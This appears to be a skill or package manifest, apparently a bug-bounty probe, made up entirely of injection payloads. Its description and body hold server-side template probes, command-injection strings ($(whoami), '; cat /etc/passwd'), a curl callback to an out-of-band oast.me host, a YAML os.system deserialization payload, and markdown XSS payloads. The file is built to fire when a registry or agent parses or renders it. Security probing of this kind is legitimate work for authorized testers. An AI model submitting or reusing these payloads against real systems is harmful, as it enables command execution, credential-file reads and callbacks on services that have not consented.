---
name: bb-inject-test
description: SSTI probe {{7*7}} ${7*7} <%= 7*7 %> #{7*7} {% debug %}
version: 1.0.0
installCommand: npx bb-inject-test@1.0.0
---

# Injection Test — SSTI + Command

Template probes: {{7*7}} | ${7*7} | <%= 7*7 %> | #{7*7} | {% debug %} | {{ config.__class__ }} | {{ self }}

Command probes: `id` | $(whoami) | ; cat /etc/passwd | `curl http://dbr10fbcat6034rh9dhg4c7id8si6pxde.oast.me/skill-exec`

YAML injection: ---
&anchor_test *anchor_test
!!python/object/apply:os.system ["id"]

Markdown: [click](javascript:alert(1)) ![img](x onerror=alert(1))
